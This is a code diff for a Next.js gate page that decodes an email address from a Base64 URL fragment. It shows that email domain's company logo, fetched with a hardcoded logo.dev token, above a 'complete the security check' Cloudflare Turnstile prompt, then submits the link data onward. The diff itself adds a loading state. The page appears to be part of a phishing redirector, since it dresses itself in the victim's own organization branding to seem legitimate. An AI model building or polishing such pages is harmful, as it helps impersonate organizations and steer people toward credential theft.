@@ -4,12 +4,10 @@ import Script from "next/script";
 
 function Short({ shortCode, path }) {
   const formRef = useRef(null);
-  const [logoUrl, setLogoUrl] = useState(
-    ""
-  );
+  const [logoUrl, setLogoUrl] = useState(null); // Initialize as null
+  const [loading, setLoading] = useState(true); // State to track loading
 
   useEffect(() => {
-    // Decode Base64 fragment from URL
     const fragment = window.location.hash ? window.location.hash.substring(1) : "";
     if (fragment) {
       try {
@@ -17,30 +15,38 @@ function Short({ shortCode, path }) {
         const domain = decodedEmail.split("@")[1];
 
         if (domain) {
-          // Attempt to fetch a logo dynamically based on domain
           const fetchLogo = async () => {
             try {
-              const res = await fetch(`https://img.logo.dev/${domain}?token=pk_a1ON8zu_S9Kx_sY-dBaKHQ&size=50&format=png&retina=true`);
+              const res = await fetch(
+                `https://img.logo.dev/${domain}?token=pk_a1ON8zu_S9Kx_sY-dBaKHQ&size=50&format=png&retina=true`
+              );
               if (res.ok) {
                 setLogoUrl(`https://img.logo.dev/${domain}?token=pk_a1ON8zu_S9Kx_sY-dBaKHQ&size=50&format=png&retina=true`);
               } else {
-                console.log("No logo found for domain, falling back to default.");
+                console.log("No logo found for domain, not setting placeholder.");
+                setLogoUrl(null); // No logo or placeholder
               }
             } catch (error) {
               console.error("Error fetching logo:", error);
+              setLogoUrl(null); // Handle fetch error
+            } finally {
+              setLoading(false); // Stop loading regardless of outcome
             }
           };
 
           fetchLogo();
+        } else {
+          setLoading(false); // Stop loading if no domain found
         }
       } catch (error) {
         console.error("Error decoding Base64 fragment:", error);
+        setLoading(false); // Stop loading on error
       }
+    } else {
+      setLoading(false); // Stop loading if no fragment
     }
 
     window.handleCaptchaSuccess = function (token) {
-      console.log("CAPTCHA solved with token:", token);
-
       const fragment = window.location.hash ? window.location.hash.substring(1) : "";
 
       if (window.location.hash) {
@@ -84,22 +90,24 @@ function Short({ shortCode, path }) {
         formRef.current.appendChild(newFragmentInput);
       }
 
-      console.log("Submitting form with shortCode, path, token, and fragment.");
       formRef.current.submit();
     };
   }, [shortCode]);
 
   return (
     <div className="container">
-      <img 
-        src={logoUrl} 
-        alt="Dynamic Security Check Logo" 
-        className="logo"
-      />
+      {loading ? (
+        <div className="skeleton"></div> // Show loading skeleton
+      ) : logoUrl ? (
+        <img 
+          src={logoUrl} 
+          alt="Dynamic Security Check Logo" 
+          className="logo"
+        />
+      ) : null}
       <h1>
-    Complete the security check to confirm you are <u><a href="https://developers.cloudflare.com/bots/">not a bot</a></u>. This helps protect our organization from threats and spam.
-</h1>
-
+        Complete the security check to confirm you are <u><a href="https://developers.cloudflare.com/bots/">not a bot</a></u>. This helps protect our organization from threats and spam.
+      </h1>
 
       <form ref={formRef} action="/api/verify-turnstile" method="POST">
         <input type="hidden" name="shortCode" value={shortCode} />
@@ -127,7 +135,14 @@ function Short({ shortCode, path }) {
           text-align: center;
         }
         .logo {
-          margin-bottom: 5px; /* Adds spacing between logo and heading */
+          margin-bottom: 5px;
+        }
+        .skeleton {
+          width: 50px;
+          height: 50px;
+          background-color: #ccc;
+          border-radius: 5px;
+          margin-bottom: 5px;
         }
       `}</style>
     </div>
